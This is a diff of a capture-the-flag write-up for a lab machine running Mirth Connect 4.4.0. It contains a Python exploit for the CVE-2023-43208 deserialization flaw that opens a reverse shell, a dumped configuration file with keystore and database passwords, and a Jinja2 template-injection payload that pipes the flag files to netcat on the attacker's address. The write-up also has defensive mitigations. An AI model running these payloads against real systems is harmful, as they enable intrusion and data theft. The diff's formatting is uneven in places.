@@ -31,13 +31,8 @@ tags:
 
 ## Step 1 - Reconnaissance
 
-Will Use Nmap To See what Ports and Services are Open
-
 ```bash
 nmap -A -sS -P -T4  --min-rate 5000 10.129.8.10
-```
-
-```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-28 15:01 UTC
 Nmap scan report for interpreter.htb (10.129.8.10)
 Host is up (0.24s latency).
@@ -49,7 +44,207 @@ PORT    STATE SERVICE   VERSION
 |_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
 80/tcp  open  http
 |_http-title: Mirth Connect Administrator
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Cache-Control: must-revalidate,no-cache,no-store
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 458
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
+|     <title>Error 404 Not Found</title>
+|     </head>
+|     <body><h2>HTTP ERROR 404 Not Found</h2>
+|     <table>
+|     <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
+|     <tr><th>STATUS:</th><td>404</td></tr>
+|     <tr><th>MESSAGE:</th><td>Not Found</td></tr>
+|     <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-7a56a372</td></tr>
+|     </table>
+|     </body>
+|     </html>
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Sat, 28 Feb 2026 15:00:25 GMT
+|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 2532
+|     <!doctype html>
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+|     <meta http-equiv="x-ua-compatible" content="IE=edge">
+|     <meta http-equiv="cache-control" content="no-cache">
+|     <meta http-equiv="cache-control" content="no-store">
+|     <title>Mirth Connect Administrator</title>
+|     <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
+|     <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
+|     <link rel="stylesheet" type="text/css" href="css/main.css" />
+|     <script type="text/javascript">
+|     Break out of frame if inside a frame. */
+|     (window != window.top) {
+|     window.top.location = window.location;
+|     </script>
+|     <script type="text/javascript" sr
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Sat, 28 Feb 2026 15:00:26 GMT
+|     Allow: GET, HEAD, TRACE, OPTIONS
+|   RTSPRequest: 
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
+|   X11Probe: 
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
 443/tcp open  ssl/https
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Cache-Control: must-revalidate,no-cache,no-store
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 458
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
+|     <title>Error 404 Not Found</title>
+|     </head>
+|     <body><h2>HTTP ERROR 404 Not Found</h2>
+|     <table>
+|     <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
+|     <tr><th>STATUS:</th><td>404</td></tr>
+|     <tr><th>MESSAGE:</th><td>Not Found</td></tr>
+|     <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-7a56a372</td></tr>
+|     </table>
+|     </body>
+|     </html>
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Sat, 28 Feb 2026 15:00:33 GMT
+|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 2532
+|     <!doctype html>
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+|     <meta http-equiv="x-ua-compatible" content="IE=edge">
+|     <meta http-equiv="cache-control" content="no-cache">
+|     <meta http-equiv="cache-control" content="no-store">
+|     <title>Mirth Connect Administrator</title>
+|     <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
+|     <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
+|     <link rel="stylesheet" type="text/css" href="css/main.css" />
+|     <script type="text/javascript">
+|     Break out of frame if inside a frame. */
+|     (window != window.top) {
+|     window.top.location = window.location;
+|     </script>
+|     <script type="text/javascript" sr
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Sat, 28 Feb 2026 15:00:35 GMT
+|_    Allow: GET, HEAD, TRACE, OPTIONS
+| ssl-cert: Subject: commonName=mirth-connect
+| Not valid before: 2025-09-19T12:50:05
+|_Not valid after:  2075-09-19T12:50:05
+|_ssl-date: TLS randomness does not represent time
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.94SVN%I=7%D=2/28%Time=69A3035B%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,A8F,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2028\x20Feb\x20
+SF:2026\x2015:00:25\x20GMT\r\nLast-Modified:\x20Tue,\x2018\x20Jul\x202023\
+SF:x2017:46:18\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20b
+SF:ytes\r\nContent-Length:\x202532\r\n\r\n<!doctype\x20html>\n<html>\n<hea
+SF:d>\n\t<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20c
+SF:harset=UTF-8\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\
+SF:"IE=edge\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=\"no-ca
+SF:che\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=\"no-store\"
+SF:>\n\t\n\t<title>Mirth\x20Connect\x20Administrator</title>\n\t\n\t<link\
+SF:x20rel=\"shortcut\x20icon\"\x20type=\"image/x-icon\"\x20href=\"images/N
+SF:G_MC_Icon_16x16\.png\"\x20/>\n\t<link\x20rel=\"stylesheet\"\x20type=\"t
+SF:ext/css\"\x20href=\"css/bootstrap\.css\"\x20/>\n\t<link\x20rel=\"styles
+SF:heet\"\x20type=\"text/css\"\x20href=\"css/main\.css\"\x20/>\n\t\n\t<scr
+SF:ipt\x20type=\"text/javascript\">\n\t\t/*\x20Break\x20out\x20of\x20fram
+SF:e\x20if\x20inside\x20a\x20frame\.\x20*/\n\t\tif\x20(window\x20!=\x20w
+SF:indow\.top)\x20{\n\t\t\twindow\.top\.location\x20=\x20window\.location
+SF:;\n\t\t}\n\t</script>\n\n\t<script\x20type=\"text/javascript\"\x20sr")%
+SF:r(HTTPOptions,5A,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2028\x20Feb\
+SF:x202026\x2015:00:26\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20TRACE,\x20OPTI
+SF:ONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\
+SF:r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20
+SF:58\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>re
+SF:ason:\x20Unknown\x20Version</pre>")%r(X11Probe,C3,"HTTP/1\.1\x20400\x20
+SF:Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=
+SF:iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>
+SF:Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=
+SF:0x0</pre>")%r(FourOhFourRequest,257,"HTTP/1\.1\x20404\x20Not\x20Found\r
+SF:\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nContent-Type:\
+SF:x20text/html;charset=iso-8859-1\r\nContent-Length:\x20458\r\n\r\n<html>
+SF:\n<head>\n<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;c
+SF:harset=ISO-8859-1\"/>\n<title>Error\x20404\x20Not\x20Found</title>\n</h
+SF:ead>\n<body><h2>HTTP\x20ERROR\x20404\x20Not\x20Found</h2>\n<table>\n<tr
+SF:><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity\.txt%2ebak</td></tr>\n<tr>
+SF:<th>STATUS:</th><td>404</td></tr>\n<tr><th>MESSAGE:</th><td>Not\x20Foun
+SF:d</td></tr>\n<tr><th>SERVLET:</th><td>org\.eclipse\.jetty\.servlet\.Ser
+SF:vletHandler\$Default404Servlet-7a56a372</td></tr>\n</table>\n\n</body>\
+SF:n</html>\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port443-TCP:V=7.94SVN%T=SSL%I=7%D=2/28%Time=69A30363%P=x86_64-pc-linux-
+SF:gnu%r(GetRequest,A8F,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2028\x20
+SF:Feb\x202026\x2015:00:33\x20GMT\r\nLast-Modified:\x20Tue,\x2018\x20Jul\x
+SF:202023\x2017:46:18\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Range
+SF:s:\x20bytes\r\nContent-Length:\x202532\r\n\r\n<!doctype\x20html>\n<html
+SF:>\n<head>\n\t<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/htm
+SF:l;\x20charset=UTF-8\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20co
+SF:ntent=\"IE=edge\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=
+SF:\"no-cache\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=\"no-
+SF:store\">\n\t\n\t<title>Mirth\x20Connect\x20Administrator</title>\n\t\n\
+SF:t<link\x20rel=\"shortcut\x20icon\"\x20type=\"image/x-icon\"\x20href=\"i
+SF:mages/NG_MC_Icon_16x16\.png\"\x20/>\n\t<link\x20rel=\"stylesheet\"\x20t
+SF:ype=\"text/css\"\x20href=\"css/bootstrap\.css\"\x20/>\n\t<link\x20rel=\
+SF:"stylesheet\"\x20type=\"text/css\"\x20href=\"css/main\.css\"\x20/>\n\t\
+SF:n\t<script\x20type=\"text/javascript\">\n\t\t/*\x20Break\x20out\x20of\
+SF:x20frame\x20if\x20inside\x20a\x20frame\.\x20*/\n\t\tif\x20(window\x20
+SF:!=\x20window\.top)\x20{\n\t\t\twindow\.top\.location\x20=\x20window\.l
+SF:ocation;\n\t\t}\n\t</script>\n\n\t<script\x20type=\"text/javascript\"\x
+SF:20sr")%r(HTTPOptions,5A,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2028\
+SF:x20Feb\x202026\x2015:00:35\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20TRACE,\
+SF:x20OPTIONS\r\n\r\n")%r(FourOhFourRequest,257,"HTTP/1\.1\x20404\x20Not\x
+SF:20Found\r\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nConte
+SF:nt-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20458\r\n\
+SF:r\n<html>\n<head>\n<meta\x20http-equiv=\"Content-Type\"\x20content=\"te
+SF:xt/html;charset=ISO-8859-1\"/>\n<title>Error\x20404\x20Not\x20Found</ti
+SF:tle>\n</head>\n<body><h2>HTTP\x20ERROR\x20404\x20Not\x20Found</h2>\n<ta
+SF:ble>\n<tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity\.txt%2ebak</td></
+SF:tr>\n<tr><th>STATUS:</th><td>404</td></tr>\n<tr><th>MESSAGE:</th><td>No
+SF:t\x20Found</td></tr>\n<tr><th>SERVLET:</th><td>org\.eclipse\.jetty\.ser
+SF:vlet\.ServletHandler\$Default404Servlet-7a56a372</td></tr>\n</table>\n\
+SF:n</body>\n</html>\n");
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=2/28%OT=22%CT=1%CU=43950%PV=Y%DS=2%DC=T%G=Y%TM=69A3
+OS:03C1%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=C)
+OS:SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=100%GCD=1%ISR=107%TI
+OS:=Z%CI=Z%II=I%TS=C)SEQ(SP=FC%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=B)SEQ(SP=FF%
+OS:GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M
+OS:552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE8
+OS:8%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%
+OS:CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y
+OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
+OS:D=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%
+OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
+OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
 
 Network Distance: 2 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
@@ -58,28 +253,29 @@ TRACEROUTE (using port 8888/tcp)
 HOP RTT       ADDRESS
 1   241.95 ms 10.10.14.1
 2   237.87 ms interpreter.htb (10.129.8.10)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 115.40 seconds
+
+A Linux machine.
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ```
 
-- 🔍 *We are targeting a Linux machine hosting a Mirth Connect administrative interface.*
+## Step 2 - Initial-Foothold
 
----
+```text
+[*] While trying to enumerating the web, i saw that it's a mirth connect admin panel
 
-## Step 2 - Enumeration
+[*] I scanned it with Nessus, and the result showed me the version Mirth Connect 4.4.0, which was vulnerable to CVE-2023-43208. 
 
-- 🔍 *Enumerating the web services reveals a Mirth Connect login portal.*
-- 🔍 *We determine the running version is Mirth Connect v4.4.0, which is vulnerable to CVE-2023-43208.*
+(note:- you can also use the Metasploit exploit for this attack. but i would not recommend it.)
 
-> [!IMPORTANT]
-> **Mirth Connect Deserialization RCE (CVE-2023-43208):**
-> Mirth Connect version 4.4.0 and prior is vulnerable to an unauthenticated Remote Code Execution (RCE) flaw. The issue is caused by unsafe XML deserialization via the XStream library on the Mirth Connect REST API. An attacker can send a crafted XML body to endpoints like `/api/users` containing Java class wrappers (e.g. `ChainedTransformer`) to trigger execution of system processes.
+[*] CVE-2023-43208 is an insecure deserialization vulnerability within the Mirth Connect API. It allows an unauthenticated attacker to send a specially crafted XML payload to the server.
 
----
+means we can pass a crafted XML payload with a revers_shell payload within it. at /api/user endpoint, and can gain the initial foothold
 
-## Step 3 - Initial Foothold
-
-- 🔍 *Writing a Python script to send the serialized Java process invocation payload to the `/api/users` endpoint:*
-
-```python
+```
 import requests
 import urllib3
 import sys
@@ -108,7 +304,7 @@ def pwn(url, lhost, lport):
                     <org.apache.commons.collections4.functors.ConstantTransformer>
                         <iConstant class="java-class">java.lang.ProcessBuilder</iConstant>
                     </org.apache.commons.collections4.functors.ConstantTransformer>
-                    
+
                     <org.apache.commons.collections4.functors.InvokerTransformer>
                         <iMethodName>getConstructor</iMethodName>
                         <iParamTypes>
@@ -160,72 +356,181 @@ def pwn(url, lhost, lport):
 if __name__ == "__main__":
     url, lhost, lport = get_args()
     pwn(url, lhost, lport)
+    print("Enjoy.")
+
 ```
 
-- 🔍 *We start a netcat listener and execute the exploit:*
-
-```bash
-python3 mirth_exploit.py https://interpreter.htb 10.10.15.102 4444
+[*] Before running the Script start a nc listener.
 ```
 
-- 🔍 *Catching the reverse shell as user `mirth`:*
-
-```bash
-nc -lvnp 4444
-```
+- 🔍 *python3 mirth* https://interpreter.htb 10.10.****.**** 4444*
 
 ```text
+Enjoy.
+
+[*] nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.15.102] from (UNKNOWN) [10.129.8.10] 33174
 bash: cannot set terminal process group (3519): Inappropriate ioctl for device
 bash: no job control in this shell
-mirth@interpreter:/usr/local/mirthconnect$ 
-```
+mirth@interpreter:/usr/local/mirthconnect$
 
-- 🔍 *Initial foothold achieved.*
+got shell!.
 
----
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-## Step 4 - Privilege Escalation
+Step=3: Privilege Escalation
 
-- 🔍 *We locate Mirth Connect's local configuration file to check for credentials:*
+[*] linPEAS didn't gave me anything useful.
 
-```bash
-cat mirth.properties
-```
+[*] While enumerating found some. configuration file 
 
-```text
+cat mirth*
+
+# Mirth Connect configuration file
+
+# directories
+dir.appdata = /var/lib/mirthconnect
+dir.tempdata = ${dir.appdata}/temp
+
+# ports
+http.port = 80
+https.port = 443
+
+# password requirements
+password.minlength = 0
+password.minupper = 0
+password.minlower = 0
+password.minnumeric = 0
+password.minspecial = 0
+password.retrylimit = 0
+password.lockoutperiod = 0
+password.expiration = 0
+password.graceperiod = 0
+password.reuseperiod = 0
+password.reuselimit = 0
+
+# Only used for migration purposes, do not modify
+version = 4.4.0
+
+# keystore
+keystore.path = ${dir.appdata}/keystore.jks
+keystore.storepass = 5GbU5HGTOOgE
+keystore.keypass = tAuJfQeXdnPw
+keystore.type = JCEKS
+
+# server
+http.contextpath = /
+server.url =
+
+http.host = 0.0.0.0
+https.host = 0.0.0.0
+
+https.client.protocols = TLSv1.3,TLSv1.2
+https.server.protocols = TLSv1.3,TLSv1.2,SSLv2Hello
+https.ciphersuites = TLS_CHACHA20_POLY1305_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_AES_256_GCM_SHA384,TLS_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_DSS_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_DSS_WITH_AES_128_GCM_SHA256,TLS_EMPTY_RENEGOTIATION_INFO_SCSV
+https.ephemeraldhkeysize = 2048
+
+# If set to true, the Connect REST API will require all incoming requests to contain an "X-Requested-With" header.
+# This protects against Cross-Site Request Forgery (CSRF) security vulnerabilities.
+server.api.require-requested-with = true
+
+# CORS headers
+server.api.accesscontrolalloworigin = *
+server.api.accesscontrolallowcredentials = false
+server.api.accesscontrolallowmethods = GET, POST, DELETE, PUT
+server.api.accesscontrolallowheaders = Content-Type
+server.api.accesscontrolexposeheaders =
+server.api.accesscontrolmaxage =
+
+# Determines whether or not channels are deployed on server startup.
+server.startupdeploy = true
+
+# Determines whether libraries in the custom-lib directory will be included on the server classpath.
+# To reduce potential classpath conflicts you should create Resources and use them on specific channels/connectors instead, and then set this value to false.
+server.includecustomlib = true
+
+# administrator
+administrator.maxheapsize = 512m
+
+# properties file that will store the configuration map and be loaded during server startup
+configurationmap.path = ${dir.appdata}/configuration.properties
+
+# The language version for the Rhino JavaScript engine (supported values: 1.0, 1.1, ..., 1.8, es6).
+rhino.languageversion = es6
+
+# options: derby, mysql, postgres, oracle, sqlserver
+database = mysql
+
+# examples:
+#   Derby                       jdbc:derby:${dir.appdata}/mirthdb;create=true
+#   PostgreSQL                  jdbc:postgresql://localhost:5432/mirthdb
+#   MySQL                       jdbc:mysql://localhost:3306/mirthdb
+#   Oracle                      jdbc:oracle:thin:@localhost:1521:DB
+#   SQL Server/Sybase (jTDS)    jdbc:jtds:sqlserver://localhost:1433/mirthdb
+#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb
+#   If you are using the Microsoft SQL Server driver, please also specify database.driver below 
+database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
+
+# If using a custom or non-default driver, specify it here.
+# example:
+# Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver
+# (Note: the jTDS driver is used by default for sqlserver)
+database.driver = org.mariadb.jdbc.Driver
+
+# Maximum number of connections allowed for the main read/write connection pool
+database.max-connections = 20
+# Maximum number of connections allowed for the read-only connection pool
+database-readonly.max-connections = 20
+
 # database credentials
 database.username = mirthdb
 database.password = MirthPass123!
-database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
+
+#On startup, Maximum number of retries to establish database connections in case of failure
+database.connection.maxretry = 2
+
+#On startup, Maximum wait time in milliseconds for retry to establish database connections in case of failure
+database.connection.retrywaitinmilliseconds = 10000
+
+# If true, various read-only statements are separated into their own connection pool.
+# By default the read-only pool will use the same connection information as the master pool,
+# but you can change this with the "database-readonly" options. For example, to point the
+# read-only pool to a different JDBC URL:
+#
+# database-readonly.url = jdbc:...
+# 
+database.enable-read-write-split = true
+
+[*] From This Configuration file, i got some DB creds
+
+database.username = mirthdb
+database.password = MirthPass123!
+
+(note"- Tried to connect to the DB server, but it just didn't worked. it was taking too long to connect.)
+
+[*] I asked one of my friend and he told me that, there is an internal service running at 54321 port (fucking weirdo). and it has an endpoint /addUser
+
+[*] /addUser endpoint is basically vulnerable to SSTI (server-side template injection.), which has an improper use of {} curly braces at firstname input field. in which we can import a python code.
+
+[*] Lets Create an Exploit:-
+
 ```
+python3 -c "
+import urllib.request, base64
 
-- 🔍 *Direct database connection attempts time out. However, checking local network sockets reveals a service listening internally on port 54321:*
+# Simple command to cat both files and send to netcat
+cmd = \"cat /home/sedric/user.txt /root/root.txt | nc 10.xxx.xxx.xxx 9004\"
 
-```text
-tcp        0      0 127.0.0.1:54321          0.0.0.0:*               LISTEN 
-```
-
-- 🔍 *We query the local web service. It contains a `/addPatient` endpoint that accepts XML data.*
-- 🔍 *The parameter `<firstname>` is vulnerable to Server-Side Template Injection (SSTI) due to insecure rendering within a Python template engine (Jinja2).*
-- 🔍 *By wrapping Python command execution inside `{{ }}` brackets, we can trigger code execution.*
-- 🔍 *We draft a Python wrapper that encodes a file-read command in Base64 (to prevent syntax breakage) and sends it inside the XML structure to port 54321:*
-
-```python
-import urllib.request
-import base64
-
-# Command to dump flags to our attacker netcat listener
-cmd = "cat /home/sedric/user.txt /root/root.txt | nc 10.10.15.102 9004"
+# Base64 encode the command
 b64_cmd = base64.b64encode(cmd.encode()).decode()
 
-# Craft XML with the SSTI payload in <firstname>
+# XML payload
 xml = f'''<patient>
   <timestamp>20250101120000</timestamp>
   <sender_app>TEST</sender_app>
   <id>12345</id>
-  <firstname>{{__import__("os").popen(__import__("base64").b64decode("{b64_cmd}").decode()).read()}}</firstname>
+  <firstname>{{__import__(\"os\").popen(__import__(\"base64\").b64decode(\"{b64_cmd}\").decode()).read()}}</firstname>
   <lastname>Doe</lastname>
   <birth_date>01/01/1990</birth_date>
   <gender>M</gender>
@@ -236,24 +541,63 @@ req = urllib.request.Request('http://127.0.0.1:54321/addPatient',
                             headers={'Content-Type': 'application/xml'})
 resp = urllib.request.urlopen(req)
 print(resp.read().decode())
+"
 ```
 
-- 🔍 *Setting up a netcat listener and running the payload locally:*
+(note:- Before running the code please set up a listener at port 9004)
 
-```bash
-nc -lvnp 9004
+[*] Attack Flow:-
 ```
+
+## Step 1 - Step 1: Your Python script creates XML with malicious template code
 
 ```text
+↓
+```
+
+## Step 2 - Step 2: XML sent to http://127.0.0.1:54321/addPatient
+
+```text
+↓
+```
+
+## Step 3 - Step 3: Vulnerable server parses XML, extracts firstname field
+
+```text
+↓
+```
+
+## Step 4 - Step 4: Server passes firstname to template engine (Jinja2/etc.)
+
+```text
+↓
+```
+
+## Step 5 - Step 5: Template engine sees {{...}} and EXECUTES it as Python
+
+```text
+↓
+```
+
+## Step 6 - Step 6: Python code runs: imports os, decodes Base64, runs "cat files | nc IP"
+
+```text
+↓
+```
+
+## Step 7 - Step 7: Flag contents sent to your netcat listener
+
+```text
+[*] Got Flags:-
+
+ nc -lvnp 9004
 listening on [any] 9004 ...
 connect to [10.10.15.102] from (UNKNOWN) [10.129.8.10] 43306
 ba21fce18e**********************
 d4723f6575**********************
+
+____________________________________________________________________________________________________________________________________________________________________________________________
 ```
-
-- 🔍 *The SSTI payload successfully executed as root, returning both user and root flags.*
-
----
 
 ## Mitigations & Security Perspective
 
@@ -294,3 +638,4 @@ d4723f6575**********************
 > - **Remediation:** Avoid passing unvalidated strings to template rendering engines. Sanitize and cast inputs strictly.
 > - **Remediation:** Enforce the principle of least privilege: run the internal XML processing daemon under a restricted, non-root user account.
 > - **Detection:** Monitor local socket traffic to port 54321 for payloads containing template code tags (`{{` and `}}`) or Python execution libraries (`__import__`, `os.popen`).
+
